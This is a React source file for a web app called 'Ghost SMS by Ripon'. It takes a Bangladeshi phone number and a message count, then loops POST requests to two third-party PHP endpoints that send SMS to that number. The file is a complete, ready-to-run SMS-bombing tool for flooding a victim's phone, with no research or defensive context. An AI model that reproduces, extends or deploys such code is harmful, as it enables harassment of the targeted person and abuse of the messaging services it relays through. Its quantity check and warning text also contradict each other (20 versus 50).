import './App.css';
import { useState } from 'react';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
const axios = require('axios').default;

function App() {
   const [phone, updatePhone] = useState('');
   const [quantity, updateQuantity] = useState(0);
   const [error, updateError] = useState('');
   const [data, setData] = useState('');

   const [loader, setLoader] = useState(false);

   const handleForm = (e) => {
      e.preventDefault();
      // e.target.reset();

      if (!phone.match(/(^(\+8801|8801|01|008801))[1|3-9]{1}(\d){8}$/)) {
         toast.error('Invalid phone number! 😒');
         return 0;
      } else if (quantity > 20) {
         toast.warning('Quantity must be less than 50! 😑');
         return 0;
      }

      setLoader(true);

      for (let i = 0; i < quantity / 2; i++) {
         (async () => {
            await axios
               .post(
                  `https://prime.mojibrsm.xyz/server/myapi/api15.php?phone=${phone}`
               )
               .then((res) => {
                  setData(res);
               })
               .catch((err) => {
                  updateError(err);
               });

            await axios
               .post(
                  `https://prime.mojibrsm.xyz/server/myapi/api14.php?phone=${phone}`
               )
               .then((res) => {
                  setData(res);
               })
               .catch((err) => {
                  updateError(err);
               });
         })();
      }

      setTimeout(() => {
         setLoader(false);
      }, 10000);
   };

   return (
      <div className="App">
         <header className="typewriter">
            {!loader && <h1>Ghost SMS by Ripon.</h1>}
            <br /> <br />
            {loader && (
               <h1>
                  Let's wait until <br /> all becomes set...! 😴
               </h1>
            )}
         </header>

         {/* form */}
         {!loader && (
            <form onSubmit={(e) => handleForm(e)}>
               <label className="phone" htmlFor="phone">
                  Enter Phone Number:
               </label>
               <br />
               <input
                  className="phone-input"
                  onChange={(e) => updatePhone(e.target.value)}
                  type="number"
                  name="phone"
                  id="phone"
                  required
               />{' '}
               <br />
               <br />
               <label className="quantity" htmlFor="quantity">
                  Enter SMS Quantity:
               </label>
               <br />
               <input
                  className="quantity-input"
                  onChange={(e) => updateQuantity(e.target.value)}
                  type="number"
                  name="quantity"
                  id="quantity"
                  required
               />
               <br />
               <br />
               <input className="btn" type="submit" value="Submit"></input>
               <ToastContainer />
            </form>
         )}
      </div>
   );
}

export default App;
